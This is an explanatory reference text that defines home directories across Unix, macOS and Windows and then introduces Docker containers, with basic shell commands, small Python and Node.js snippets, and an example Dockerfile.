A **home directory** is a directory on a computer operating system where a user's personal files, settings, and directories are stored. Each user account on a system has its own home directory, providing a private space for the user's data. 

#### Key Characteristics:
- **Personal Space:** It contains personal files such as documents, pictures, music, and other user-specific data.
- **Configuration Files:** It stores user-specific configuration files and settings for various applications and the operating system itself.
- **Default Location:** It is the default location where many applications look for user-specific configurations and files.

#### Location by Operating System:
- **Unix/Linux:** Typically located at `/home/username`. For example, the home directory for a user named `alice` would be `/home/alice`.
- **macOS:** Located at `/Users/username`. For example, the home directory for a user named `john` would be `/Users/john`.
- **Windows:** Located at `C:\Users\username`. For example, the home directory for a user named `mary` would be `C:\Users\mary`.

#### Usage:
- **Command Line Access:**
  - **Unix/Linux/macOS:** You can navigate to your home directory using the command `cd ~` or simply `cd`.
  - **Windows:** You can navigate to your home directory using the command `cd %HOMEPATH%` in Command Prompt or PowerShell.

- **Environment Variables:**
  - **Unix/Linux/macOS:** The home directory is often referenced by the `HOME` environment variable, accessed as `$HOME`.
  - **Windows:** The home directory is referenced by the `HOMEPATH` environment variable, accessed as `%HOMEPATH%`.

#### Example Paths:
- **Unix/Linux:**
  ```sh
  echo $HOME
  # Output might be: /home/username
  ```
- **Windows:**
  ```cmd
  echo %HOMEPATH%
  # Output might be: \Users\username
  ```

### Example Usage in Code:
- **Python:**
  ```python
  import os
  home_directory = os.path.expanduser('~')
  print(f'The home directory is: {home_directory}')
  ```
- **JavaScript (Node.js):**
  ```javascript
  const os = require('os');
  const homeDirectory = os.homedir();
  console.log(`The home directory is: ${homeDirectory}`);
  ```

### Importance:
1. **User Isolation:** Each user has a separate home directory, which helps in isolating user data and settings.
2. **Security:** Provides a secure space for users to store their personal files.
3. **Convenience:** Acts as a central location for all user-specific data, making it easy to manage and backup.

Home directories play a crucial role in multi-user operating systems, providing a consistent and secure environment for each user's personal files and settings.

--------------

### Docker Container

A **Docker container** is a lightweight, standalone, and executable software package that includes everything needed to run a piece of software, including the code, runtime, libraries, environment variables, and system tools. Containers are built from Docker images and are designed to be portable and consistent across different environments.

#### Key Characteristics:
- **Isolation:** Containers provide process and resource isolation through operating system-level virtualization, ensuring that applications run consistently regardless of the environment.
- **Lightweight:** Containers share the host OS kernel, making them more lightweight and faster to start compared to traditional virtual machines.
- **Portability:** Containers can run on any system that supports Docker, ensuring that applications can move seamlessly between development, testing, and production environments.

#### Basic Concepts:
- **Docker Image:** A read-only template used to create containers. Images are built from Dockerfiles and can be stored in repositories like Docker Hub.
- **Docker Container:** A runtime instance of a Docker image. Containers are created, started, stopped, and deleted using Docker commands.
- **Dockerfile:** A text file with instructions on how to build a Docker image. It specifies the base image, environment variables, commands to run, and other configurations.

#### Common Docker Commands:
- **Pull an Image:**
  ```sh
  docker pull <image_name>
  # Example: docker pull ubuntu
  ```
- **Run a Container:**
  ```sh
  docker run -it --name <container_name> <image_name>
  # Example: docker run -it --name my_ubuntu ubuntu
  ```
- **List Running Containers:**
  ```sh
  docker ps
  ```
- **List All Containers (Including Stopped):**
  ```sh
  docker ps -a
  ```
- **Stop a Container:**
  ```sh
  docker stop <container_name_or_id>
  # Example: docker stop my_ubuntu
  ```
- **Remove a Container:**
  ```sh
  docker rm <container_name_or_id>
  # Example: docker rm my_ubuntu
  ```
- **Build an Image from a Dockerfile:**
  ```sh
  docker build -t <image_name> .
  # Example: docker build -t my_image .
  ```

#### Example Dockerfile:
```dockerfile
# Use an official Python runtime as a parent image
FROM python:3.9-slim

# Set the working directory
WORKDIR /usr/src/app

# Copy the current directory contents into the container at /usr/src/app
COPY . .

# Install any needed packages specified in requirements.txt
RUN pip install --no-cache-dir -r requirements.txt

# Make port 80 available to the world outside this container
EXPOSE 80

# Define environment variable
ENV NAME World

# Run app.py when the container launches
CMD ["python", "app.py"]
```

### Benefits of Docker Containers:
1. **Consistency:** Provides a consistent environment from development to production.
2. **Efficiency:** Uses system resources more efficiently than traditional VMs.
3. **Scalability:** Easily scalable, supporting microservices architectures.
4. **Isolation:** Ensures application isolation and security.

### Use Cases:
- **Microservices:** Running small, independent services that can be deployed and scaled individually.
- **CI/CD Pipelines:** Automating the build, test, and deployment processes.
- **Development Environments:** Creating consistent development environments across different machines and teams.
- **Legacy Applications:** Containerizing legacy applications to run on modern infrastructure without modification.

Docker containers have revolutionized the way software is developed, tested, and deployed, providing a standardized unit of software that is portable, efficient, and consistent.